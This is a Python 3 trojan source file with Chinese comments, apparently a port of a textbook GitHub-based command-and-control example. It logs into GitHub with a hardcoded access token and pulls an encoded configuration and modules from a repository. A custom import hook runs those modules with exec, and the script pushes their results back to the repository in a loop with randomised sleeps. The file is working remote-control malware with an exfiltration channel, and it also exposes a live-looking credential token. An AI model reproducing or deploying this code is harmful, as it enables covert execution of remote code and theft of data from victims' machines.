# 注意导入模块，没有导入imp模块，也没有导入importlib模块，原先的import imp模块换成了import types
import base64
import json
import os
import queue
import random
import sys
import threading
import time
import types

from github3 import login


trojan_id = "abc"
trojan_config = "%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_modules = []
configured = False
task_queue = queue.Queue()
token = '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'

# 跟github交互得到repo，branch
def connect_to_github():
    gh = login(token=token)
    repo = gh.repository("xuanxuanzi7", "xuan")
    branch = repo.branch("master")
    return gh, repo, branch

# 从远程repo中抓取文件
def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.to_tree().recurse()
    # tree.tree 是一个hash值列表
    # filename.path 是文件名路径
    # 存储库文件结构由Tree对象表示

    for filename in tree.tree:
        if filepath in filename.path:
            print("[*] Found file %s" % filepath)
            """
            原代码是用blob = repo.blob(filename._json_data['sha'])，根据上
            面h.path,h.sha解释,我试着用filename.sha代替
            filename._json_data['sha']是可行的，毕竟太长记不住。

            """

            # blob = repo.blob(filename._json_data['sha']) 原代码
            blob = repo.blob(filename.sha)
            # blob.decoded 是用base64解密后的文件内容
            # blob.encoding  是加密方式
            return blob.content
        	# blob.content 是一种base64加密的文件
    # 获得文件返回文件内容，否则返回None
    return None

# 获取repo中的远程配置文件
def get_trojan_config():
    global configured
    # 读取repo远程配置文件json格式
    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    # print(config)
    configured = True
    # task 是一个字典，{'module':environment}
    for task in config:
        # 如果远程配置模块不是系统模块，导入远程配置模块
        if task['module'] not in sys.modules:
            # exec python3
            exec("import %s" % task['module'])

    return config

def store_module_result(data):
    gh, repo, branch = connect_to_github()
    remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))
    # data.encode() python3与python2不同，要自己编码成bytes
    repo.create_file(remote_path, "Commit message",
                base64.b64encode(data.encode()))
    return


class GitImporter(object):
    def __init__(self):
        # 要运行的模块内容
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print("[*] Attempting to retrieve %s" % fullname)
            # 从repo中拉取需要用的module
            new_library = get_file_contents("modules/%s" % fullname)
            if new_library is not None:
                self.current_module_code = base64.b64decode(
                    new_library).decode()
                return self
        # 找到需要用的module就返回其中内容，未找到返回None，同样python3通信后的数据bytes需要data.decode()解码成str
        return None

    def load_module(self, name):
        """
        imp.new_module(name)返回一个名为name的新的空模块对象。该对象未被插入
        sys.modules，原代码就是这一句，我花费好长时间查看importlib文档结果没找到
        解决方法，查了imp.new_module才知道就是用types.ModuleType模块类型，
        imp.new_module(name)就是返回return types.ModuleType(name)，这里就
        直接module=types.ModuleType(name)
        """

        # module = imp.new_module(name)
        module = types.ModuleType(name)
        # 加载模块内容
        exec(self.current_module_code, module.__dict__)
        # 将module插入sys.modules,sys.modules是一个字典
        sys.modules[name] = module
        return module
# 运行模块
def module_runner(module):
    task_queue.put(1)
    # 调用module中的run()方法
    """
    def run(**args):
    		print("[*] In dirlister_h module.")
    		files = os.listdir(".")
    		return str(files)
    """
    result = sys.modules[module].run()
    task_queue.get()
    # 把执行结果发送至github中data文件夹下面
    store_module_result(result)
    return
# 添加自定义类GitImporter()到sys.meta_path，可以实现自定义模块导入
sys.meta_path = [GitImporter()]

while True:
    if task_queue.empty():
        config = get_trojan_config()
        for task in config:
            t = threading.Thread(target=module_runner,
                                 args=(task['module'],))
            t.start()
            time.sleep(random.randint(1, 10))
    time.sleep(random.randint(1000,10000))
